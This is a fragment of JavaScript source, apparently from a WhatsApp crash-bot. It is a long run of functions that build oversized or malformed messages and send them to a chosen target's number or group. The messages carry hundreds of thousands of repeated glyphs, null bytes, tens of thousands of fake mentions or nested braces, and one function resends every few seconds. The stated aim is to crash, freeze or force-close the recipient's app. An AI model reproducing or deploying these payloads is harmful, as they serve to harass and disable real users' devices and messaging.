                            fileEncSha256: "6gmEaQ6o3q7TgsBLKLYlr8sJmbb+yYxpYLuQ1F4vbBs=",
                            directPath: "/v/t62.7119-24/30623531_8925861100811717_6603685184702665673_n.enc?ccb=11-4&oh=01_Q5AaIN8EZu9FKxglUrb240_UXS3DGwZHc6a_fKzCxAbB1DFB&oe=675EE231&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1731681321"
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦾ".repeat(300000) + "@1".repeat(70000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: ["1@newsletter"],
                        groupMentions: [{
                            groupJid: "1@newsletter",
                            groupSubject: "RxhL"
                        }],
                        quotedMessage: {
                            documentMessage: {
                                contactVcard: true
                            }
                        }
                    }
                }
            }
        }
    }, {
        participant: {
            jid: target
        }
    }, {
        messageId: null
    });
}
async function xatacrash(target) {
  try {
    setInterval(async () => {
      let message = {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: "xatanic.com",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: [{
                name: "call_permission_request",
                paramsJson: "\0".repeat(1000000),
                version: 3
              }, {
                name: "mpm",
                paramsJson: "\0".repeat(7000),
                version: 3
              }, {
                name: "payment_transaction_request",
                paramsJson: JSON.stringify({
                  syncType: "full_sync",
                  data: "\0".repeat(7000)
                }),
                version: 3
              }]
            }
          }
        }
      };
      await sock.relayMessage(target, message, {
        participant: {
          jid: target
        }
      });
      console.log("🔥 Crash bug dikirim ke " + target);
    }, 3000);
  } catch (err) {
    console.log(err);
  }
}
async function VampireBlankIphone(target) {
    try {
        const messsage = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "ᐯᗩᗰᑭIᖇᗴ ᑎO Oᒪᗴᑎᘜ" + "ી".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000,
                    },
                },
            },
        };
        await sock.relayMessage(target, messsage, {
            userJid: target,
        });
    }
    catch (err) {
        console.log(err);
    }
}
async function VampireInvisIphone(target) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000),
    contextInfo: {
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "ᴠᴀᴍᴘɪʀᴇ ᴄʀᴀsʜ ɪᴏs" + "ꦾ࣯࣯".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}
async function VampireCrashiPhone(target) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: `iOS Crash` + "࣯ꦾ".repeat(90000),
    contextInfo: {
      fromMe: false,
      stanzaId: target,
      participant: target,
      quotedMessage: {
        conversation: "VampireBug ‌" + "ꦾ".repeat(90000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  participant: {
    jid: target,
  },
},
{
  messageId: null,
}
);
}
// SPECIAL VAMPIRE BUG
async function NewpayFc1(target) {
    sock.relayMessage(
        target,
        {
            interactiveMessage: {
                header: {
                    title: "戋ざ Zoro Crasher Gen 2 戋ざ",
                    hasMediaAttachment: false
                },
                body: {
                    text: "🦄드림 가이 Kino-Хороший",
                },
                nativeFlowMessage: {
                    messageParamsJson: "",
                    buttons: [
                        { name: "single_select", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
                        { name: "payment_method", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
                        { name: "call_permission_request", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999), voice_call: "call_galaxy" },
                        { name: "form_message", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
                        { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
                        { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
                        { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
                        { name: "catalog_message", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
                        { name: "payment_info", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
                        { name: "review_order", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
                        { name: "send_location", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
                        { name: "+s_care_csat", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
                        { name: "view_product", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) },
                        { name: "payment_settings", buttonParamsJson: venomModsData + "🦄드림 가이 Kino-Хороший".repeat(9999) }
                    ]
                }
            }
        },
        { participant: { jid: target } }
    );
}

async function VampCrashCH(target) {
  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "review_order",
            buttonParamsJson: {
              reference_id: Math.random().toString(11).substring(2, 10).toUpperCase(),
              order: {
                status: "completed",
                order_type: "ORDER"
              },
              share_payment_status: true
            }
          }
        ],
        messageParamsJson: {}
      }
   }
  }, { userJid: target }); // Perbaiki dari isTarget ke target

  await sock.relayMessage(target, msg.message, { 
    messageId: msg.key.id 
  });
}
async function VampCrashCH2(target) {
    await sock.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "peler"
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "review_order",
                                    buttonParamsJson: "\u0000".repeat(99999)
                                }
                            ]
                        }
                    }
                }
            }
        },
        {},
        { messageId: null }
    );
}

async function VampireBugIns(target) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "𝚅𝚊𝚖𝚙𝚒𝚛𝚎" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "Vampire",
                    },
                ],
            },
        };

        await sock.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}
async function FloodsCarousel(target, Ptcp = true) {
    const header = {
        locationMessage: {
            degreesLatitude: 0,
            degreesLongitude: 0,
        },
        hasMediaAttachment: true,
    };

    const body = {
        text: "MACHINE ENIGMA CAROUSELS" + "᭯".repeat(90000),
    };

    const CrLMessege = {
        sections: [
            {
                title: "\u200C".repeat(90000),
                rows: [
                   { title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
                    { title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
                ],
            },
            {
                title: "\u200c".repeat(90000),
                rows: [
                    { title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
                    { title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
                ],
            },
            {
              title: "\u200c".repeat(90000),
                rows: [
                    { title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
                    { title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
                ],
            },
            {
                title: "\u200c".repeat(90000),
                rows: [
                    { title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
                    { title: "\u200D".repeat(90000), description: "\u200D".repeat(90000), rowId: "\u200D".repeat(90000) },
                ],
            },
        ],
    };

    const MsgNative = {
        messageParamsJson: '{'.repeat(999),
        buttons: [
            {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({ status: true })
            },
            {
                name: "single_select",
                buttonParamsJson: JSON.stringify({ status: true })
            }
        ]
    };

    await sock.relayMessage(
        target,
        {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: header,
                        body: body,
                        carouselMessage: CrLMessege,
                        nativeFlowMessage: MsgNative
                    },
                },
            },
        },
        Ptcp ? { participant: { jid: target } } : { quoted: null }
    );
}
async function FlowXNull(target) {
  const MSG = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "⛧ 𝑅𝐴𝐿𝐷𝑍𝑍 𝑋𝑃𝐿𝑂𝐼𝑇 ⛧  \n" + 
                 "@0@1".repeat(30000),
            format: "DEFAULT",
            contextInfo: {
              mentionedJid: [
                target,
                "0@s.whatsapp.net",
                ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              ],
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING"
              },
            }
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message", // can changed to "call_permission_request" 
            paramsJson: "{".repeat(50000) + "}".repeat(50000), 
            version: 3
          }
        }
      }
    }
  };

  await sock.relayMessage(target, MSG, {
    participant: { jid: target }
  });
}
async function CrlSqL(target) {
  const cards = [];

  const media = await prepareWAMessageMedia(
    { video: fs.readFileSync("./console/media/song.mp4") },
    { upload: sock.waUploadToServer }
  );

  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "FnX-" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "🧬⃟༑⌁⃰𝐓‌𝐚𝐦‌𝐚 𝐂𝐨𝐧‌‌𝐜𝐮‌𝐞𝐫𝐫𝐨𝐫ཀ‌‌🪅",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "Finix AI Broadcast",
              body: "Trusted System",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://tama.example.com",
              showAdAttribution: false // trigger 1
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 5; r++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000) // trigger 2
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "FnX" + "-Id" + Math.floor(Math.random() * 99999), // trigger 3
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"], // trigger 4
              externalAdReply: {
                title: "Finix Engine",
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://finix-ai.example.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}
async function VampNewAttack(target, ptcp = true) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞.𝐂𝐥𝐨𝐮𝐝𝐬",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "ⱽᵃᵐᵖᶦʳᵉ ᵛˢ ᵉᵛᵉʳʸᵇᵒᵈʸ" + "ꦾ".repeat(100000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "ⱽᵃᵐᵖᶦʳᵉ ᵛˢ ᵐᵃʳᵏ ᶻᵘᶜᵏᵉʳᵇᵉʳᵍ"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "ᵖᵃˢᵘᵏᵃⁿ ᵃⁿᵗᶦ ᵍᶦᵐᵐᶦᶜᵏ"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await vamp.relayMessage(target, msg.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
            console.log(chalk.green("VaMPiRe - BuGBoT"));
        }
        async function VampNewCrash(target, ptcp = true) {
            let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞.𝐧𝐞𝐭",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "ⱽᵃᵐᵖᶦʳᵉ ᵛˢ ᵖᵒˡᶦᶜᵉ" + "ꦽ".repeat(50000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "ᵛᵃᵐᵖᶦʳᵉ ⁿᵉᵛᵉʳ ˡᵒˢᵗ"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "ᵛᵃᵐᵖᶦʳᵉ ʳᵃⁿˢᵒᵐᵉʷᵃʳᵉ ᵇᵒᵗⁿᵉᵗ.ᶦᵈ"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await vamp.relayMessage(target, msg.message, ptcp ? {
				participant: {
					jid: target
				}
			} : {});
            console.log(chalk.green("VaMPiRe - BuGBoT"));
        }
        

//BUG INVIS DELAY NEW VAMPIRE
async function VampDeviceCrash(target, Ptcp = true) {
    await sock.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "Vampire.Clouds.net",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "꧔꧈".repeat(102000),
                        version: 3
                    }
                }
            }
        }
    }, { participant: { jid: target}});
}
const Qcrl = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    interactiveMessage: {
      body: { 
        title: "", 
        text: "\u0000".repeat(1000000),
        footer: "",
        description: ""
      },
      carouselMessage: {
        cards: []
      },
      contextInfo: {
        mentionedJid: ["status@broadcast"]
      }
    }
  }
};
async function VampUrlCrash(target, Ptcp = true) {
    let pesan = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: "Vampire.Firebase" + "\u0000".repeat(1000000) },
                    nativeFlowMessage: {
                        messageParamsJson: JSON.stringify({
                            name: "galaxy_message",
                            title: "null",
                            header: "I'm The King Of Vampire",
                            body: "👀"
                        }),
                        buttons: []
                    },
                    contextInfo: {
                        mentionedJid: [target],
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    }, { quoted: Qcrl });

    await vamp.relayMessage(target, pesan.message, Ptcp ? { participant: { jid: target, messageId: pesan.key.id } } : {});
    console.log(chalk.blue(" success send bug "))
}
async function VampDelayMess(target, Ptcp = true) {
      await sock.relayMessage(target, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞.𝐜𝐨𝐦",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: ""
                },
                hasMediaAttachment: true
              },
              body: {
                text: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞.𝐜𝐨𝐦\n" + "@15056662003".repeat(17000)
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{ display_text: 'Iqbhalkeifer', url: \"https://youtube.com/@iqbhalkeifer25\", merchant_url: \"https://youtube.com/@iqbhalkeifer25\" }"
                }, {
                  name: "call_permission_request",
                  buttonParamsJson: "{}"
                }],
                messageParamsJson: "{}"
              },
              contextInfo: {
                mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({
                  length: 30000
                }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                forwardingScore: 1,
                isForwarded: true,
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                quotedMessage: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                    fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞 𝐯𝐬 𝐄𝐯𝐞𝐫𝐲𝐛𝐨𝐝𝐲",
                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1724474503",
                    contactVcard: true,
                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ""
                  }
                }
              }
            }
          }
        }
      }, Ptcp ? {
        participant: {
          jid: target
        }
      } : {});
    }
    async function NoClickFC(target) {
  try {
    let msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              externalAdReply: {
                title: "-",
                body: "-",
                mediaType: 1,
                renderLargerThumbnail: true,
                thumbnail: Buffer.alloc(999999), // buffer overload
                mediaUrl: "https://error",
                sourceUrl: "https://forceclose"
              },
              businessMessageForwardInfo: {
                businessOwnerJid: target
              }
            },
            body: {
              text: "\u2060".repeat(5000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "mpm",
                  buttonParamsJson: "{" .repeat(99999)
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "[".repeat(88888)
                },
                {
                  name: "single_select",
                  buttonParamsJson: "crash".repeat(44444)
                }
              ]
            }
          }
        }
      }
    }

    await sock.relayMessage(target, msg, {
      participant: { jid: target }
    })

  } catch (e) {
    console.error(e)
  }
}
async function VampireBugIns(groupJid) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "𝚅𝚊𝚖𝚙𝚒𝚛𝚎" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
                messageParamsJson: "",
                buttons: [
                    {
                        name: "call_permission_request",
                        buttonParamsJson: "{}",
                    },
                    {
                        name: "galaxy_message",
                        paramsJson: {
                            "screen_2_OptIn_0": true,
                            "screen_2_OptIn_1": true,
                            "screen_1_Dropdown_0": "nullOnTop",
                            "screen_1_DatePicker_1": "1028995200000",
                            "screen_1_TextInput_2": "null@gmail.com",
                            "screen_1_TextInput_3": "94643116",
                            "screen_0_TextInput_0": "\u0000".repeat(500000),
                            "screen_0_TextInput_1": "SecretDocu",
                            "screen_0_Dropdown_2": "#926-Xnull",
                            "screen_0_RadioButtonsGroup_3": "0_true",
                            "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                        },
                    },
                ],
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: groupJid,
                        groupSubject: "Vampire",
                    },
                ],
            },
        };

        await sock.relayMessage(groupJid, message, {}); // Hapus userJid untuk grup
        console.log(`Success sending bug to group: ${groupJid}`);
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}
//Made by Gizz
async function delaykon(target) {
  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () =>
      `1${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
    )
  ];

  const bug = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: "Xrelly Mp5",
      previewType: "NONE",
      contextInfo: {
        mentionedJid: mentionedList,
        forwardingScore: 2,
        isForwarded: true,
        isFromMe: true,
        externalAdReply: {
          title: ".",
          body: "؄؂؂؀؁ب".repeat(1800),
          mediaType: "VIDEO",
          renderLargerThumbnail: true,
          previewType: "VIDEO",
          thumbnail: slash,
          sourceType: "R",
          sourceId: "R",
          sourceUrl: "https://t.me/kipopLecy",
          mediaUrl: "https://t.me/kipopLecy",
          containsAutoReply: true,
          showAdAttribution: true,
          ctwaClid: "ctwa_clid_example",
          ref: "ref_example"
        },
        quotedMessage: {
          contactMessage: {
            displayName: "ONE BUG 🐞",
            vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑 \nTEL;type=CELL:+5521992999999\nEND:VCARD"
          }
        },
        remoteJid: "status@broadcast"
      },
      inviteLinkGroupTypeV2: "DEFAULT"
    }
  }, {
    participant: { jid: target }
  });


  await sock.relayMessage(target, bug.message, {
    messageId: bug.key.id
  });
}
async function delayByGizz(target) {
  return new Promise(async (resolve) => {
    try {
      const content = generateWAMessageFromContent(target, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: {
              body: {
                text: '\u0000'
              },
              footer: {
                text: '\u0000'
              },
              header: {
                hasMediaAttachment: false
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: '\u0000',
                    buttonParamsJson: `https://wa.me/999999999?text=${"\u0000".repeat(1000000)}`,
                  }
                ]
              }
            }
          }
        }
      }, {});

      await sock.relayMessage(target, content.message, {
        messageId: content.key.id,
        participant: { jid: target }
      });

      setTimeout(() => resolve(), 2000);
    } catch (err) {
      console.error('failed:', err);
      resolve();
    }
  });
}

async function bulldozer3(target, mention) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});
if (!msg.key || !msg.key.id) {
  msg.key = {
    remoteJid: target,
    fromMe: true,
    id: (Math.random() * 1e16).toString(36)
  };
}


  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}
async function bulldozerV2(target) {
  const stickerPayload = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1337133713371337_9999999999999999999_n.enc?ccb=11-4&oh=fake&oe=666",
      fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
      fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
      mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
      mimetype: "image/webp",
      directPath: "/v/t62.7161-24/10000000_1337133713371337_9999999999999999999_n.enc?ccb=11-4&oh=fake&oe=666",
      fileLength: { low: 99999999, high: 0, unsigned: true },
      mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
      firstFrameLength: 50000,
      firstFrameSidecar: "QmFkUmVhZHlUT1JFQ1Q=",
      isAnimated: true,
      isAvatar: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: Array.from({ length: 60000 }, () =>
          "1" + Math.floor(Math.random() * 999999999) + "@s.whatsapp.net"
        ),
        forwardingScore: 999999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "\u200E".repeat(40000),
          body: "\u200E".repeat(40000),
          mediaUrl: "",
          mediaType: 1,
          thumbnail: Buffer.from([]),
          sourceUrl: "",
          renderLargerThumbnail: true
        }
      }
    }
  };

  const templatePayload = {
    templateMessage: {
      hydratedTemplate: {
        hydratedContentText: "\u200E".repeat(90000),
        hydratedFooterText: "Oblivion Force Activated",
        hydratedButtons: [],
        templateId: "oblivion_" + Date.now(),
        contextInfo: {
          quotedMessage: stickerPayload,
          forwardingScore: 88888,
          isForwarded: true
        }
      }
    }
  };

  const wrap = {
    viewOnceMessage: {
      message: templatePayload
    }
  };

  const msg = generateWAMessageFromContent(target, wrap, {
    quoted: null,
    messageId: "oblv_" + Date.now()
  });

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
